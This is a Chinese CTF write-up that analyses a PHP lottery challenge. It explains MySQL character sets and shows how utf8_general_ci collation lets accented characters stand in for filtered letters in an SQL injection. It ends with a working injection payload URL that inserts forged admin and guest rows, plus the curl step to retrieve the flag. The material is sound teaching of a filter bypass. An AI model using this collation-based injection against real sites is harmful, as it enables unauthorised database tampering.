# 从一道题深入mysql字符集与比对方法collation

阅读量 **137528**

|评论 **2**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2018-03-28 16:00:23

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p2.ssl.qhimg.com/t01beea28a19b2988b6.jpg)

## 前记

今天做了一道审计题目，决定是时候好好研究一下mysql字符集与比对方法collation的问题了，于是有了这篇文章  
首先我们看一下题目的整体流程（注：因为核心代码就100行，所以都贴上来了）

## 题目描述

首先发现存在robots.txt

    
    
    http://cheaplottery.solveme.peng.kr/robots.txt
    

发现

    
    
    User-agent: *
    Disallow: /backup/
    

存在文件泄露，其中sql文件

    
    
    CREATE TABLE `lottery` (
      `name` char(30) NOT NULL,
      `time` int(4) NOT NULL,
      `nums` char(30) NOT NULL
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8;
    
    ALTER TABLE `lottery`
      ADD UNIQUE KEY `name` (`name`);
    

然后是Index.php

    
    
    <?php
        require __DIR__."/_config.php";
        $sql = new mysqli($sql_host, $sql_username, $sql_password, $sql_dbname) or die("SQL Server Down T.T");
    
        $name = "guest_".$_SERVER['REMOTE_ADDR'];
        $result = $sql->query("SELECT * FROM `lottery` WHERE `name`='{$name}';");
        $row_guest = $result->fetch_assoc();
        unset($name, $result);
    
        if(isset($_GET['lottery']) && is_array($_GET['lottery']) && count($_GET['lottery']) == 5){ // buy request
    
            if(isset($row_guest)){ // already bought
    
                $msg = "You already bought a lottery ticket at ".date('Y-m-d H:i:s', $row_guest['time']).".";
                $buy_enable = false;
    
            }else{ // not bought yet, but buy now
    
                // insert real answer
                $name = "admin_".$_SERVER['REMOTE_ADDR'];
                $time = time();
                $nums = implode(",", [ mt_rand(1, 100), mt_rand(1, 100), mt_rand(1, 100), mt_rand(1, 100), mt_rand(1, 100) ]);
                $sql->query("INSERT INTO `lottery`(`name`, `time`, `nums`) VALUE('{$name}', '{$time}', '{$nums}');");
                unset($name, $time, $nums);
    
                // insert my answer
                $name = "guest_".$_SERVER['REMOTE_ADDR'];
                $time = time();
    
                $url_query = urldecode(parse_url($_SERVER['REQUEST_URI'], PHP_URL_QUERY));
                $nums = preg_replace("/[a-zA-Z[]=]/", "", $url_query);
                $nums = strtr($nums, "&", ",");
                $sql->query("INSERT INTO `lottery`(`name`, `time`, `nums`) VALUE('{$name}', '{$time}', '{$nums}');");
                unset($name, $time, $url_query, $nums);
    
                $msg = "You bought a lottery ticket. Please wait 60 sec.";
                $buy_enable = false;
            }
    
        }else{ // not buy request
    
            if(isset($row_guest)){ // already bought
    
                if(intval($row_guest['time']) + 60 <= time()){ // publish result
    
                    $name = "admin_".$_SERVER['REMOTE_ADDR'];
                    $result = $sql->query("SELECT * FROM `lottery` WHERE `name`='{$name}';");
                    $row_admin = $result->fetch_assoc();
                    unset($name, $result);
    
                    // check answer
                    $bingo = 0;
                    $nums_admin = explode(",", $row_admin['nums']); // admin_*
                    $nums_guest = explode(",", $row_guest['nums']); // guest_*
                    for($i = 0; $i < 5; ++$i){
                        for($k = 0; $k < 5; ++$k){
                            if(isset($nums_admin[$i], $nums_guest[$k]) && $nums_admin[$i] === $nums_guest[$k]){
                                ++$bingo;
                                unset($nums_guest[$k]);
                                break;
                            }
                        }
                    }
                    unset($nums_admin, $nums_guest);
    
                    if($bingo == 5){ // correct all
                        $msg = "Perfect! The flag is <code>{$flag}</code>.";
    
                    }elseif($bingo > 0){ // correct
                        $msg = "Excellent! You matched {$bingo} numbers. :)";
    
                    }else{ // incorrect
                        $msg = "Oops! You did not even match one. :(";
    
                    }
                    $buy_enable = true;
    
                    $name_admin = "admin_".$_SERVER['REMOTE_ADDR'];
                    $name_guest = "guest_".$_SERVER['REMOTE_ADDR'];
                    $sql->query("DELETE FROM `lottery` WHERE `name` IN ('{$name_admin}', '{$name_guest}');");
                    unset($name, $name_admin, $name_guest);
    
                }else{
    
                    $msg = "Please wait until at ".date('Y-m-d H:i:s', intval($row_guest['time']) + 60).".";
                    $buy_enable = false;
                }
    
            }else{ // not bought
    
                $msg = "Oh, Please buy a lottery ticket. It's free!";
                $buy_enable = true;
            }
        }
    ?>
    

分析一下流程：  
如果发送了购买参数的时候  
即：

    
    
    if(isset($_GET['lottery']) && is_array($_GET['lottery']) && count($_GET['lottery']) == 5)
    

1.判断你是否购买过  
2.如果购买过，就提示你已经购买，并把你的购买资格赋false  
3.如果没购买过：

    
    
    $name = "admin_".$_SERVER['REMOTE_ADDR'];
    $time = time();
    $nums = implode(",", [ mt_rand(1, 100), mt_rand(1, 100), mt_rand(1, 100), mt_rand(1, 100), mt_rand(1, 100) ]);
    $sql->query("INSERT INTO `lottery`(`name`, `time`, `nums`) VALUE('{$name}', '{$time}', '{$nums}');");
    unset($name, $time, $nums);
    

就添加一条管理员数据，其中：  
管理员name：根据你的remote_addr生成  
管理员time：当前时间  
管理员nums：随机从1~100生成5个  
然后unset 3个变量  
4.然后根据你的输入插入数据:

    
    
    $name = "guest_".$_SERVER['REMOTE_ADDR'];
    $time = time();
    $url_query = urldecode(parse_url($_SERVER['REQUEST_URI'], PHP_URL_QUERY));
    $nums = preg_replace("/[a-zA-Z[]=]/", "", $url_query);
    $nums = strtr($nums, "&", ",");
    $sql->query("INSERT INTO `lottery`(`name`, `time`, `nums`) VALUE('{$name}', '{$time}', '{$nums}');");
    unset($name, $time, $url_query, $nums);
    

你的name：根据你的remote_addr生成  
你的time：当前时间  
你的nums：

    
    
    $url_query = urldecode(parse_url($_SERVER['REQUEST_URI'], PHP_URL_QUERY));
    $nums = preg_replace("/[a-zA-Z[]=]/", "", $url_query);
    $nums = strtr($nums, "&", ",");
    

根据这段代码获取，分析一下：  
首先是parse_url解析出query部分  
然后进行urldecode(这里说明一下，`$_SERVER['REQUEST_URI']`是不会自动解url的，所以不存在2次编码问题)  
接着将`[a-zA-Z[]=]`替换为空，这里很难受，没有字母  
然后将结果中的`&`都转为`,`  
然后进行插入：

    
    
    $sql->query("INSERT INTO `lottery`(`name`, `time`, `nums`) VALUE('{$name}', '{$time}', '{$nums}');");
    

最后再次unset()  
然后将你的购买权限置false  
如果没发送购买请求：  
1.根据你的remote_addr查询你的管理员信息  
2.并将查询结果存入`$row_admin`  
3.check你的结果

    
    
    $bingo = 0;
    $nums_admin = explode(",", $row_admin['nums']); // admin_*
    $nums_guest = explode(",", $row_guest['nums']); // guest_*
    for($i = 0; $i < 5; ++$i){
        for($k = 0; $k < 5; ++$k){
            if(isset($nums_admin[$i], $nums_guest[$k]) && $nums_admin[$i] === $nums_guest[$k]){
                ++$bingo;
                unset($nums_guest[$k]);
                break;
            }
        }
    }
    

用$nums_admin[$i]逐个和5个$nums_guest[$k]进行匹配，如果相等就unset正确的$nums_guest[$k]  
大致意思是：  
你的5个答案与顺序无关，只要和随机生成的5个数值一样就行  
4.给出结果

    
    
    if($bingo == 5){ // correct all
    $msg = "Perfect! The flag is <code>{$flag}</code>.";
    
    }elseif($bingo > 0){ // correct
        $msg = "Excellent! You matched {$bingo} numbers. :)";
    
    }else{ // incorrect
        $msg = "Oops! You did not even match one. :(";
    
    }
    

5.最后处理

    
    
    $name_admin = "admin_".$_SERVER['REMOTE_ADDR'];
    $name_guest = "guest_".$_SERVER['REMOTE_ADDR'];
    $sql->query("DELETE FROM `lottery` WHERE `name` IN ('{$name_admin}', '{$name_guest}');");
    unset($name, $name_admin, $name_guest);
    

删除管理员和你的数据

## 漏洞点发现

这样看起来，100行的代码，不可能存在太多奇葩的攻击  
目前看来无非就进行一个sql操作，所以问题归结起来可能就2点:

    
    
    1.sql注入攻击
    2.逻辑漏洞
    

这里我更偏向于sql注入攻击，因为大家容易发现题目的两个特征：

    
    
    1.关于sql的过滤不是非常严格，只过滤了字母等一些符号
    2.题目直接给出了sql文件
    

那么漏洞点在哪里呢？  
首先我排除了注出数据的可能，因为没有字母，连16进制(0x)都无法使用  
那么看起来可能需要我们插入数据  
例如：  
我们有一台ip为123.123.123.123的vps  
我们如果能够用自己的本机插入数据：

    
    
    admin_123.123.123.123 time() 1,1,1,1,1
    guest_123.123.123.123 time() 1,1,1,1,1
    

那么此时我们再用vps去curl一下这个网站，是不是就可以立刻进入check，从而成功使bingo为5，获得flag呢？  
但是新的问题来了，我们没有字母，如何解决admin和guest这10个字母的问题呢？

## 是mysql字符集的问题吗？

想到这个点是因为ph牛曾写过一篇文章：

    
    
    https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html
    

分析相当透彻  
我们不妨先在自己的机器上看看

    
    
    mysql> SHOW VARIABLES LIKE 'character_set_%';
    +--------------------------+----------------------------+
    | Variable_name            | Value                      |
    +--------------------------+----------------------------+
    | character_set_client     | latin1                     |
    | character_set_connection | latin1                     |
    | character_set_database   | latin1                     |
    | character_set_filesystem | binary                     |
    | character_set_results    | latin1                     |
    | character_set_server     | latin1                     |
    | character_set_system     | utf8                       |
    | character_sets_dir       | /usr/share/mysql/charsets/ |
    +--------------------------+----------------------------+
    8 rows in set (0.01 sec)
    

这些是什么意思呢？

    
    
    character_set_server：默认的内部操作字符集
    character_set_client：客户端来源数据使用的字符集
    character_set_connection：连接层字符集
    character_set_results：查询结果字符集
    character_set_database：当前选中数据库的默认字符集
    character_set_system：系统元数据(字段名等)字符集
    

此时如果我们set utf8:

    
    
    mysql> set names utf8;
    Query OK, 0 rows affected (0.00 sec)
    
    mysql> SHOW VARIABLES LIKE 'character_set_%';
    +--------------------------+----------------------------+
    | Variable_name            | Value                      |
    +--------------------------+----------------------------+
    | character_set_client     | utf8                       |
    | character_set_connection | utf8                       |
    | character_set_database   | latin1                     |
    | character_set_filesystem | binary                     |
    | character_set_results    | utf8                       |
    | character_set_server     | latin1                     |
    | character_set_system     | utf8                       |
    | character_sets_dir       | /usr/share/mysql/charsets/ |
    +--------------------------+----------------------------+
    8 rows in set (0.00 sec)
    

不难发现，只有

    
    
    character_set_client 
    character_set_connection
    character_set_results
    

成功被更改了  
而

    
    
    character_set_database
    character_set_server
    

依旧是latin1  
这有什么用呢？  
我们看到鸟哥的这篇文章里讲解了mysql字符集（同时ph牛也有提到)  
`http://www.laruence.com/2008/01/05/12.html`  
其中有一段关于MySQL中的字符集转换过程：

    
    
    1. MySQL Server收到请求时将请求数据从character_set_client转换为character_set_connection；
    2. 进行内部操作前将请求数据从character_set_connection转换为内部操作字符集，其确定方法如下：
    使用每个数据字段的CHARACTER SET设定值；
    • 若上述值不存在，则使用对应数据表的DEFAULT CHARACTER SET设定值(MySQL扩展，非SQL标准)；
    • 若上述值不存在，则使用对应数据库的DEFAULT CHARACTER SET设定值；
    • 若上述值不存在，则使用character_set_server设定值。
    3. 将操作结果从内部操作字符集转换为character_set_results。
    

也就是：

    
    
    character_set_client -> character_set_connection -> 内部操作字符集
    

但是想到这里，我立刻发现，这个trick似乎并不能Bypass我当前的问题  
因为对于这道题目，我们的转换过程为

    
    
    utf8->utf8->utf8
    

而ph牛当时的bypass时过程为：

    
    
    utf8->utf8->latin1
    

那么还有没有突破口，可以不用字母a，而让mysql认定我们的输入为a呢？

## 神奇的COLLATION

后来有师傅点播，突破口在于  
utf8编码和默认collation字符顺序下不同编码字符被认为相等的特性  
即可能使mysql不区分à与a的问题  
首先说一说character set与collation的关系

    
    
    mysql 有两个支持 unicode 的 character set:
    
    ucs2: 使用 16 bits 来表示一个 unicode 字符。
    utf8: 使用 1~3 bytes 来表示一个 unicode 字符。
    

而在本题目中，sql文件中显示

    
    
    ENGINE=InnoDB DEFAULT CHARSET=utf8;
    

很显然这里是utf8  
而我们本地尝试

    
    
    mysql> show collation where collation like '%utf8%';
    +--------------------------+---------+-----+---------+----------+---------+
    | Collation                | Charset | Id  | Default | Compiled | Sortlen |
    +--------------------------+---------+-----+---------+----------+---------+
    | utf8_general_ci          | utf8    |  33 | Yes     | Yes      |       1 |
    | utf8_bin                 | utf8    |  83 |         | Yes      |       1 |
    | utf8_unicode_ci          | utf8    | 192 |         | Yes      |       8 |
    | utf8_icelandic_ci        | utf8    | 193 |         | Yes      |       8 |
    | utf8_latvian_ci          | utf8    | 194 |         | Yes      |       8 |
    | utf8_romanian_ci         | utf8    | 195 |         | Yes      |       8 |
    | utf8_slovenian_ci        | utf8    | 196 |         | Yes      |       8 |
    | utf8_polish_ci           | utf8    | 197 |         | Yes      |       8 |
    | utf8_estonian_ci         | utf8    | 198 |         | Yes      |       8 |
    | utf8_spanish_ci          | utf8    | 199 |         | Yes      |       8 |
    | utf8_swedish_ci          | utf8    | 200 |         | Yes      |       8 |
    | utf8_turkish_ci          | utf8    | 201 |         | Yes      |       8 |
    | utf8_czech_ci            | utf8    | 202 |         | Yes      |       8 |
    | utf8_danish_ci           | utf8    | 203 |         | Yes      |       8 |
    

容易发现我们若不指定collation则默认选择为utf8_general_ci  
而collation名字的规则可以归纳为这两类：

    
    
    1. <character set>_<language/other>_<ci/cs>
    2. <character set>_bin
    

其中ci是case insensitive的缩写，即大小写不敏感  
所以这里我们得知utf8_general_ci的字符顺序下，大小写是不敏感的，即

    
    
    admin = ADmIn
    

然后继续查阅官方手册

    
    
    https://dev.mysql.com/doc/refman/5.7/en/charset-unicode-sets.html
    

可以知道utf8_general_ci是不支持扩展，缩小或可忽略字符的传统归类。它只能进行字符之间的一对一比较  
并且有如下样例比对。  
对于utf8_general_ci，认为以下样例是相等的

    
    
    Ä = A
    Ö = O
    Ü = U
    

为此我查阅了unicode手册，其中  
The Unicode Collation Algorithm（unicode排序算法)  
详细介绍了在需要保持符合Unicode标准的要求的时候，如何比对两个unicode字符串：  
在它的默认样例中我们得知如下顺序

    
    
    1.alphabetic ordering
    2.diacritic ordering
    3.case ordering.
    

个人认为正是因为`diacritic ordering`的排序问题  
使得读音符号最后被认定为英文字母  
这里有师傅给了我这样一张表：

    
    
    http://collation-charts.org/mysql60/mysql604.utf8_general_ci.european.html
    

由此我构造出了admin和guest

    
    
    admin:%C3%A0%C4%8F%E1%B9%81%C3%8D%C3%B1
    guest:%C4%9D%C3%9B%C3%A8%C5%9B%C5%A3
    

## payload

    
    
    <?php 
    $a = 你的vps;
    $time =time();
    $url = "http://cheaplottery.solveme.peng.kr/index.php?lottery%5BA%5D=1'),('%C3%A0%C4%8F%E1%B9%81%C3%8D%C3%B1_".$a."','$time','1,1,1,1,1'),('%C4%9D%C3%9B%C3%A8%C5%9B%C5%A3_".$a."','$time','1,1,1,1,1')%23&lottery%5BB%5D=&lottery%5BC%5D=&lottery%5BD%5D=&lottery%5BE%5D=";
    echo $url;
     ?>
    

最后访问生成的url，然后用你的vps去`curl http://cheaplottery.solveme.peng.kr/index.php`  
即可获得flag:`flag{8241a0f25778068af771a35290c15907}`

## 后记

由于本人水平有限，难免文章中出现错误或理解不正确的问题，还请各位师傅发现后指出，帮助我多多完善自己，Thanks~

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **一叶飘零** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/101939](/post/id/101939)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [漏洞利用](/tag/漏洞利用)
  * [mysql字符集](/tag/mysql字符集)
  * [collation](/tag/collation)
  * [sql注入攻击](/tag/sql注入攻击)

 **+1** __6赞

 __收藏

![](https://p0.ssl.qhimg.com/t0115eb10739cb26739.png) 一叶飘零

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

